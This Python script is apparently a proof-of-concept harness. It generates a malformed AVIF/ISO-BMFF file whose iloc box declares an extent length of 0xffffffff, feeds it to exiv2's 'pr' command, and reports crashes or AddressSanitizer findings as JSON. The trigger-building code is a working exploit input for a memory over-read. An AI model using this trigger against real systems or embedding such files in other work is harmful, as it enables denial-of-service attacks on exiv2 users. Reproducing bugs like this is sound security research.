#!/usr/bin/env python3
"""PoC driver: reach a memory-safety flaw in exiv2's BMFF (ISO-BMFF) parser
via its normal command-line interface.

The target (exiv2, an image-metadata CLI) is driven as:

    exiv2 pr <trigger-file>

The trigger file is constructed dynamically by this script: a minimal
ISO-BMFF container (ftyp + meta) whose `iloc` (item location) box describes
two items:

  * item 1: two zero-length extents (declares a total data size of 0)
  * item 2: one extent whose 32-bit length field is 0xffffffff

On a vulnerable build, the box parser reads each item's extents into a
buffer sized from a 32-bit length; item 2's length of 0xffffffff makes the
reader walk past the end of the underlying memory-mapped/heap buffer,
producing a SIGSEGV (or an AddressSanitizer heap-buffer-overflow report on
instrumented builds). A fixed build rejects or bounds-checks the bogus
extent length and exits normally (typically "No Exif data found", rc 253).

The script prints a JSON report on stdout and optionally writes it to
--json-out. It uses only the Python standard library, performs no network
access, does no fuzzing, and cleans up its temporary directory.
"""

import argparse
import json
import os
import shutil
import signal
import struct
import subprocess
import sys
import tempfile
import time

# Sanitizer / crash evidence markers we look for in the target's output.
SANITIZER_MARKERS = (
    "ERROR: AddressSanitizer",
    "SUMMARY: AddressSanitizer",
    "AddressSanitizer",
    "heap-buffer-overflow",
    "stack-buffer-overflow",
    "use-after-free",
    "SEGV on unknown address",
    "UndefinedBehaviorSanitizer",
    "runtime error:",
)

MAX_CAPTURE = 256 * 1024  # truncate captured streams beyond this


def _box(box_type: bytes, payload: bytes) -> bytes:
    """Assemble one ISO-BMFF box: 32-bit big-endian size + 4CC + payload."""
    return struct.pack(">I", len(payload) + 8) + box_type + payload


def build_trigger() -> bytes:
    """Build the minimal crashing BMFF file (generated in code, ~110 bytes).

    Layout:
      ftyp  -- major brand 'avif' so exiv2 dispatches to its BMFF parser
      meta  -- full box containing only an `iloc` box
      iloc  -- version 0, offset_size=4, length_size=4, two items:
                 item 1: two extents of length 0 (total size 0)
                 item 2: one extent with length 0xffffffff
    """
    # ftyp: major_brand, minor_version, compatible_brands
    ftyp = _box(b"ftyp", b"avif" + struct.pack(">I", 0) + b"avif")

    # iloc full box: version 0, flags 0
    iloc = bytes(4)
    iloc += bytes([0x44, 0x00])          # offset_size=4, length_size=4, base_offset_size=0, index_size=0
    iloc += struct.pack(">H", 2)         # item_count = 2
    # item 1: item_ID=1, data_reference_index=0, two zero-length extents
    iloc += struct.pack(">H", 1)         # item_ID
    iloc += struct.pack(">H", 0)         # data_reference_index
    iloc += struct.pack(">H", 2)         # extent_count = 2
    iloc += struct.pack(">I", 0) + struct.pack(">I", 0)  # extent 1: offset 0, length 0
    iloc += struct.pack(">I", 0) + struct.pack(">I", 0)  # extent 2: offset 0, length 0
    # item 2: item_ID=2, one extent with length 0xffffffff
    iloc += struct.pack(">H", 2)         # item_ID
    iloc += struct.pack(">H", 0)         # data_reference_index
    iloc += struct.pack(">H", 1)         # extent_count = 1
    iloc += struct.pack(">I", 0)         # extent_offset
    iloc += struct.pack(">I", 0xFFFFFFFF)  # extent_length -> 32-bit -1, over-read
    iloc_box = _box(b"iloc", iloc)

    meta = _box(b"meta", bytes(4) + iloc_box)  # meta full box header + iloc
    return ftyp + meta


def _truncate(text: str) -> str:
    if len(text) > MAX_CAPTURE:
        return text[:MAX_CAPTURE] + "\n...[truncated]"
    return text


def _find_sanitizer_marker(text: str):
    for line in text.splitlines():
        for marker in SANITIZER_MARKERS:
            if marker in line:
                return line.strip()
    return None


def _signal_name(returncode: int):
    if returncode < 0:
        try:
            return signal.Signals(-returncode).name
        except ValueError:
            return "SIG%d" % (-returncode)
    return None


def run_target(binary: str, timeout: float) -> dict:
    """Generate the trigger, invoke the target CLI, and build the report."""
    command = [binary, "pr", None]  # placeholder; filled with trigger path

    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": None, "value": None, "path": None},
        "error": None,
    }

    tmpdir = tempfile.mkdtemp(prefix="exiv2_poc_")
    try:
        trigger_path = os.path.join(tmpdir, "trigger.avif")
        with open(trigger_path, "wb") as fh:
            fh.write(build_trigger())

        command[2] = trigger_path
        result["command"] = list(command)

        start = time.monotonic()
        try:
            proc = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
            result["runtime_ms"] = int((time.monotonic() - start) * 1000)
            result["returncode"] = proc.returncode
            result["stdout"] = _truncate(proc.stdout.decode("utf-8", errors="replace"))
            result["stderr"] = _truncate(proc.stderr.decode("utf-8", errors="replace"))
        except subprocess.TimeoutExpired as exc:
            result["runtime_ms"] = int((time.monotonic() - start) * 1000)
            result["timed_out"] = True
            if exc.stdout:
                result["stdout"] = _truncate(
                    (exc.stdout if isinstance(exc.stdout, str)
                     else exc.stdout.decode("utf-8", errors="replace"))
                )
            if exc.stderr:
                result["stderr"] = _truncate(
                    (exc.stderr if isinstance(exc.stderr, str)
                     else exc.stderr.decode("utf-8", errors="replace"))
                )
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    # Classify what we observed.
    sig_name = None
    if result["returncode"] is not None and result["returncode"] < 0:
        sig_name = _signal_name(result["returncode"])
        result["signal"] = sig_name

    combined = result["stdout"] + "\n" + result["stderr"]
    marker = _find_sanitizer_marker(combined)

    if result["timed_out"]:
        result["observable"] = {
            "kind": "crash_trace",
            "value": "timeout",
            "path": None,
        }
    elif marker is not None:
        # Memory-instrumented build reported a sanitizer diagnostic.
        result["observable"] = {
            "kind": "crash_trace",
            "value": marker,
            "path": None,
        }
    elif sig_name is not None:
        # Terminated by a signal: direct memory-corruption evidence.
        result["observable"] = {
            "kind": "crash_trace",
            "value": sig_name,
            "path": None,
        }
    else:
        # No crash evidence: report the program's own error/exit text.
        text = result["stderr"].strip() or result["stdout"].strip()
        value = text.splitlines()[-1] if text else ("exit code %s" % result["returncode"])
        result["observable"] = {
            "kind": "stderr" if result["stderr"].strip() else "stdout",
            "value": value,
            "path": None,
        }

    return result


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Drive an exiv2 binary against a generated BMFF trigger "
                    "and report whether a memory-safety flaw is reachable."
    )
    parser.add_argument("--binary", required=True, help="path to the target exiv2 binary")
    parser.add_argument("--json-out", default=None, help="also write the JSON report to this path")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="per-run timeout in seconds (default: 30)")
    args = parser.parse_args(argv)

    if args.timeout <= 0:
        report = {
            "binary": args.binary,
            "command": None,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": None, "value": None, "path": None},
            "error": "invalid --timeout value: %r" % args.timeout,
        }
        _emit(report, args.json_out)
        return 2

    binary = os.path.abspath(args.binary)
    if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
        report = {
            "binary": args.binary,
            "command": None,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": None, "value": None, "path": None},
            "error": "binary not found or not executable: %s" % args.binary,
        }
        _emit(report, args.json_out)
        return 2

    try:
        report = run_target(binary, args.timeout)
    except Exception as exc:  # internal script failure -> error field
        report = {
            "binary": args.binary,
            "command": None,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": None, "value": None, "path": None},
            "error": "internal error: %s: %s" % (type(exc).__name__, exc),
        }
        _emit(report, args.json_out)
        return 1

    _emit(report, args.json_out)
    return 0


def _emit(report: dict, json_out) -> None:
    text = json.dumps(report, indent=2)
    print(text)
    if json_out:
        with open(json_out, "w") as fh:
            fh.write(text + "\n")


if __name__ == "__main__":
    sys.exit(main())
